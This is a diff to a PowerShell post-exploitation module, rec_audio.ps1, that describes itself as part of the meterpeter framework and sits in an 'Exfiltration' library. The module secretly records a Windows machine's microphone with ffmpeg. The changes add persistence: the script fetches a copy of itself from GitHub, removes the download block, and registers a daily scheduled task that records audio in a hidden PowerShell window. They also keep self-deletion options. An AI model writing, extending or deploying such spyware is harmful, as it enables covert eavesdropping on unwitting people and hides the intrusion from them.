@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: ffmpeg.exe {auto-download}
    Optional Dependencies: Curl, WinGet {native}
-   PS cmdlet Dev version: v2.2.9
+   PS cmdlet Dev version: v2.2.10
 
 .DESCRIPTION
    Auxiliary Module of meterpeter v2.10.14.1 that records native
@@ -39,8 +39,14 @@
 .Parameter RecTime
    Record audio for xx seconds (default: 10)
 
+.Parameter Volume
+   AudioClip.mp3 audio volume (default: 1.4)
+
 .Parameter Installer
    Install ffmpeg from Store|GitHub (default: GitHub)
+
+.Parameter Schedule
+   Schedule rec_audio cmdlet hidden execution [HH:mm]
 
 .Parameter Random
    Switch that random generates Mp3 filename
@@ -76,6 +82,10 @@
 .EXAMPLE
    PS C:\> .\rec_audio.ps1 -workingdir "$Env:TMP" -forceenvpath
    Use %TMP% has working dir, Import ffmpeg to Environment path [$Env:PATH]
+
+.EXAMPLE
+   PS C:\> .\rec_audio.ps1 -workingdir "$Env:TMP" -schedule '15:43'
+   Schedule rec_audio.ps1 hidden execution to '15:43' hours [daily]
 
 .EXAMPLE
    PS C:\> .\rec_audio.ps1 -uninstall -installer 'store'
@@ -131,9 +141,11 @@
    [string]$WorkingDir="$Env:TMP",
    [string]$Installer="GitHub",
    [string]$LogLevel="info",
+   [string]$Schedule="off",
    [switch]$ForceEnvPath,
    [switch]$AutoDelete,
    [switch]$UnInstall,
+   [int]$Volume='1.4',
    [int]$RecTime='10',
    [switch]$LogFile,
    [switch]$Random
@@ -173,6 +185,121 @@ Invoke-CurrentTime
 write-host "`n[$global:CurrTime] 🔌 record native microphone audio 🔌" -ForegroundColor Green
 If($LogFile.IsPresent){echo "[$global:CurrTime] 🔌 record native microphone audio 🔌" > "$WorkingDir\ffmpeg.log"}
 
+
+If($Schedule -match '^(\d{2}:\d{2})$')
+{
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - Schedule rec_audio exec to '15:43' [daily]
+
+   .NOTES
+      The schedule task executes rec_audio.ps1 cmdlet daily at
+      the selected time frame (-schedule 'HH:mm') in an hidden
+      terminal console detach from parent process (orphan process)
+      and also creates ffmpeg.log (in workingdir) for debug issues
+
+   .OUTPUTS
+      [20:42] 🔌 record native microphone audio 🔌
+      [20:42] Schedule rec_audio exec to '15:43' [daily]
+      [20:43] Port rec_audio cmdlet to working directory
+      [20:43] Creating daily task to execute rec_audio.ps1
+
+      TaskName                                 Next Run Time          Status         
+      ======================================== ====================== ===============
+      RecordMicrophoneAudio                    05/03/2024 15:43:00    Ready 
+   #>
+
+   Invoke-CurrentTime
+   write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline
+   write-host "Schedule rec_audio exec to '$Schedule' [daily]"
+
+   ## Make sure TaskName to create does not exist already
+   Start-Process -WindowStyle Hidden powershell -ArgumentList "schtasks /query /Tn `"RecordMicrophoneAudio`" > MakeSure.log" -Wait
+   $RetrieveTask = (Get-Content -Path "MakeSure.log" -Raw)
+   Remove-Item -Path "MakeSure.log" -Force
+
+   If(-not([string]::IsNullOrEmpty($RetrieveTask)))
+   {
+      write-host "[ABORT] " -ForegroundColor Red -NoNewline;write-host "TaskName: '" -NoNewline
+      write-host "RecordMicrophoneAudio" -ForegroundColor Red -NoNewline;write-host "' already exists"
+
+      If($LogFile.IsPresent)
+      {
+         Invoke-CurrentTime
+         echo "[$global:CurrTime] Schedule rec_audio exec to '$Schedule' [daily]" >> "$WorkingDir\ffmpeg.log"
+         echo "[ABORT] TaskName: 'RecordMicrophoneAudio' already exists in schtasks" >> "$WorkingDir\ffmpeg.log"
+      }
+
+      write-host ""
+      cd "$IPath"
+      return
+   }
+
+   If($LogFile.IsPresent)
+   {
+      Invoke-CurrentTime
+      echo "[$global:CurrTime] Schedule rec_audio exec to '$Schedule' [daily]" >> "$WorkingDir\ffmpeg.log"
+   }
+
+   If(-not(Test-Path -Path "$WorkingDir\rec_audio.ps1"))
+   {
+      write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline
+      write-host "Port rec_audio cmdlet to working directory"
+
+      ## Port rec_audio to working directory
+      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/rec_audio.ps1" -OutFile "$WorkingDir\rec_audio.ps1"|Unblock-File
+   }
+
+   Invoke-CurrentTime
+   write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline
+   write-host "Creating daily task to execute rec_audio.ps1"
+
+   ## Create daily task that executes {hidden} rec_audio.ps1 at selected hour {$Schedule}
+   If($LogFile.IsPresent){echo "[$global:CurrTime] Creating daily task to execute rec_audio.ps1" >> "$WorkingDir\ffmpeg.log"} 
+   SCHTASKS /CREATE /SC DAILY /TN "RecordMicrophoneAudio" /TR "powershell -windowstyle hidden -file $WorkingDir\rec_audio.ps1 -workingdir $WorkingDir -rectime $rectime -logfile" /ST "$Schedule"|Out-Null
+
+   Invoke-CurrentTime
+   Start-Process -WindowStyle Hidden powershell -ArgumentList "schtasks /query /Tn `"RecordMicrophoneAudio`" > MakeSure.log" -Wait
+   $RetrieveTask = (Get-Content -Path "MakeSure.log" -Raw)
+   Remove-Item -Path "MakeSure.log" -Force
+
+   ## Make sure task was successfuly created
+   If([string]::IsNullOrEmpty($RetrieveTask))
+   {
+      write-host "[$global:CurrTime] Error: fail to create schedule task!"
+      If($LogFile.IsPresent){echo "[$global:CurrTime] Error: fail to create schedule task!" >> "$WorkingDir\ffmpeg.log"}         
+   }
+   Else
+   {
+      $DisplayTask = (schtasks /Query /tn "RecordMicrophoneAudio") -replace 'Folder: \\',''
+      If($LogFile.IsPresent){echo "[$global:CurrTime] Task Schedule to '$Schedule'" >> "$WorkingDir\ffmpeg.log"}
+      echo $DisplayTask
+   }
+
+   write-host ""
+   cd "$IPath"
+   return
+}
+
+If(($UnInstall.IsPresent) -and ($Schedule -match '^(UnInstall)$'))
+{
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - Delete Schedule task [daily]
+
+   .OUTPUTS
+      [20:42] 🔌 record native microphone audio 🔌
+      WARNING: Are you sure you want to remove the task "RecordMicrophoneAudio" (Y/N)? y
+      SUCCESS: The scheduled task "RecordMicrophoneAudio" was successfully deleted.
+   #>
+
+   SCHTASKS /DELETE /TN "RecordMicrophoneAudio"
+   write-host ""
+   cd "$IPath"
+   return
+}
 
 If(($UnInstall.IsPresent) -and ($Installer -match '^(GitHub)$'))
 {
@@ -229,14 +356,15 @@ If(($UnInstall.IsPresent) -and ($Installer -match '^(GitHub)$'))
       write-host "[" -ForegroundColor Red -NoNewline;write-host "DELETE VARIABLES" -NoNewline
       write-host "] `$(rundll32.exe sysdm.cpl,EditEnvironmentVariables)" -ForegroundColor Red
 
+      write-host ""
+      cd "$IPath"
+
       If($AutoDelete.IsPresent)
       {
          ## Auto-Deletes this cmdlet in the end
          Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
       }
 
-      write-host ""
-      cd "$IPath"
       return
    }
 
@@ -297,8 +425,8 @@ If(($UnInstall.IsPresent) -and ($Installer -match '^(GitHub)$'))
 
       Invoke-CurrentTime
       write-host "[$global:CurrTime] FFmpeg environment path successfuly deleted!" -ForegroundColor Green
-      write-host "[$global:CurrTime] " -NoNewline;write-host "Path" -ForegroundColor Green -NoNewline
-      write-host " -> " -NoNewline;write-host "'$DeleteThisPath'`n" -ForegroundColor Green
+      write-host "[$global:CurrTime]" -ForegroundColor Green -NoNewline;write-host " Path -> '" -NoNewline
+      write-host "$DeleteThisPath" -ForegroundColor Red -NoNewline;write-host "'"
    }
    Else
    {
@@ -306,9 +434,15 @@ If(($UnInstall.IsPresent) -and ($Installer -match '^(GitHub)$'))
       write-host "] `$(rundll32.exe sysdm.cpl,EditEnvironmentVariables)" -ForegroundColor Red
    }
 
-   If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
    write-host ""
    cd "$IPath"
+
+   If($AutoDelete.IsPresent)
+   {
+      ## Auto-Delete this cmdlet in the end
+      Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
+   }
+
    return 
 }
 
@@ -345,10 +479,9 @@ If(($UnInstall.IsPresent) -and ($Installer -match '^(Store|Mtore|WinGet)$'))
       write-host "[ABORT] 'FFmpeg' not found in msstore [LOCAL]`n`n" -ForegroundColor Red
       winget list
 
+      write-host "";cd "$IPath"
       If($LogFile.IsPresent){echo "[$global:CurrTime] Abort: FFmpeg not found in msstore [local]" >> "$WorkingDir\ffmpeg.log"}
       If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
-      write-host ""
-      cd "$IPath"
       return      
    }
 
@@ -367,13 +500,15 @@ If(($UnInstall.IsPresent) -and ($Installer -match '^(Store|Mtore|WinGet)$'))
    Remove-Item -Path "$WorkingDir\cv_debug.log" -Force
    Remove-Item -Path "$WorkingDir\WinGet" -Force -Recurse
 
+   write-host ""
+   cd "$IPath"
+
    If($AutoDelete.IsPresent)
    {
+      ## Auto-Delete this cmdlet in the end
       Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
    }
 
-   write-host ""
-   cd "$IPath"
    return
 }
 
@@ -423,11 +558,11 @@ If($Installer -imatch '^(Store|MStore|WinGet)$')
       $IsAvailable = (Winget search --name "FFmpeg" --exact|Select-String -Pattern "Gyan.FFmpeg")
       If([string]::IsNullOrEmpty($IsAvailable))
       {
+         cd "$IPath"
          Invoke-CurrentTime
          write-host "[$global:CurrTime] Error: program 'FFmpeg' not found in msstore!`n" -ForegroundColor Red
          If($LogFile.IsPresent){echo "[$global:CurrTime] Error: program 'FFmpeg' not found in msstore!`n" >> "$WorkingDir\ffmpeg.log"}
          If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
-         cd "$IPath"
          return      
       }
 
@@ -435,11 +570,11 @@ If($Installer -imatch '^(Store|MStore|WinGet)$')
       winget install --name "FFmpeg" --id "Gyan.FFmpeg" --silent --force --accept-package-agreements --accept-source-agreements --disable-interactivity
       If($? -match 'false')
       {
+         cd "$IPath"
          Invoke-CurrentTime
          write-host "[$global:CurrTime] Error: fail installing program 'FFmpeg' id 'Gyan.FFmpeg' from msstore`n" -ForegroundColor Red
          If($LogFile.IsPresent){echo "[$global:CurrTime] Error: fail installing program 'FFmpeg' id 'Gyan.FFmpeg' from msstore`n" >> "$WorkingDir\ffmpeg.log"}
          If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
-         cd "$IPath"
          return      
       }
 
@@ -487,11 +622,11 @@ Else
 
       If(-not(Test-Path "$WorkingDir\ffmpeg-release-essentials.zip"))
       {
+         cd "$IPath"
          Invoke-CurrentTime
          write-host "[$global:CurrTime] Error: fail downloading $WorkingDir\ffmpeg-release-essentials.zip`n" -ForegroundColor Red
          If($LogFile.IsPresent){echo "[$global:CurrTime] Error: fail downloading $WorkingDir\ffmpeg-release-essentials.zip`n" >> "$WorkingDir\ffmpeg.log"}
          If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
-         cd "$IPath"
          return
       }
 
@@ -501,11 +636,11 @@ Else
       If($LogFile.IsPresent){echo "[$global:CurrTime] Expand-Zip  : '$WorkingDir\ffmpeg-release-essentials.zip'" >> "$WorkingDir\ffmpeg.log"}
       If(-not(Test-Path "$WorkingDir\ffmpeg-6.1.1-essentials_build"))
       {
+         cd "$IPath"
          Invoke-CurrentTime
          write-host "[$global:CurrTime] Error: fail expanding ffmpeg-release-essentials.zip archive`n" -ForegroundColor Red
          If($LogFile.IsPresent){echo "[$global:CurrTime] Error: fail expanding ffmpeg-release-essentials.zip archive`n" >> "$WorkingDir\ffmpeg.log"}
          If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
-         cd "$IPath"
          return
       }
 
@@ -521,11 +656,11 @@ Else
    ## Make sure we have downloaded ffmpeg.exe!
    If(-not(Test-Path "$WorkingDir\ffmpeg.exe"))
    {
+      cd "$IPath"
       Invoke-CurrentTime
       write-host "[$global:CurrTime] Error: fail downloading ffmpeg.exe to '$WorkingDir'`n" -ForegroundColor Red
       If($LogFile.IsPresent){echo "[$global:CurrTime] Error: fail downloading ffmpeg.exe to '$WorkingDir'`n" >> "$WorkingDir\ffmpeg.log"}
       If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
-      cd "$IPath"
       return
    }
 }
@@ -552,6 +687,12 @@ If($Random.IsPresent)
 Else
 {
    $MP3Path = "$WorkingDir" + "\" + "$mp3Name" -join ''
+}
+
+## File.MP3 audio volume limmiter 
+If(($Volume -gt 1.5) -or ($Volume -lt 0.1))
+{
+   [int]$Volume='1.4'
 }
 
 If($Installer -imatch '^(Store|MStore|WinGet)$')
@@ -589,17 +730,17 @@ If($Installer -imatch '^(Store|MStore|WinGet)$')
 
    If([string]::IsNullOrEmpty($FFmpegInstallPath))
    {
+      cd "$IPath"
       Invoke-CurrentTime
       write-host "[$global:CurrTime] Error: cmdlet can't retrieve ffmpeg full path location`n" -ForegroundColor Red
       If($LogFile.IsPresent){echo "[$global:CurrTime] Error: cmdlet can't retrieve ffmpeg full path location`n" >> "$WorkingDir\ffmpeg.log"}
       If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
-      cd "$IPath"
       return
    }
 
    cd "$FFmpegInstallPath"
    ## cd "$Env:LOCALAPPDATA\Microsoft\WinGet\Packages\Gyan.FFmpeg_Microsoft.Winget.Source_8wekyb3d8bbwe\ffmpeg-6.1.1-full_build\bin"
-   .\ffmpeg.exe -y -hide_banner -loglevel "$LogLevel" -f dshow -i audio="$MicName" -filter_complex "volume=1.5" -t $RecTime -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $MP3Path;
+   .\ffmpeg.exe -y -hide_banner -loglevel "$LogLevel" -f dshow -i audio="$MicName" -filter_complex "volume=$Volume" -t $RecTime -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $MP3Path;
 }
 Else
 {
@@ -632,7 +773,7 @@ Else
    write-host "ffmpeg.exe" -ForegroundColor Green -NoNewline;write-host " from '" -NoNewline
    write-host "$WorkingDir" -ForegroundColor Green -NoNewline;write-host "'"
    If($LogFile.IsPresent){echo "[$global:CurrTime] executing   : ffmpeg.exe from '$WorkingDir'" >> "$WorkingDir\ffmpeg.log"}
-   .\ffmpeg.exe -y -hide_banner -loglevel "$LogLevel" -f dshow -i audio="$MicName" -filter_complex "volume=1.5" -t $RecTime -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $MP3Path;
+   .\ffmpeg.exe -y -hide_banner -loglevel "$LogLevel" -f dshow -i audio="$MicName" -filter_complex "volume=$Volume" -t $RecTime -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $MP3Path;
 }
 
 
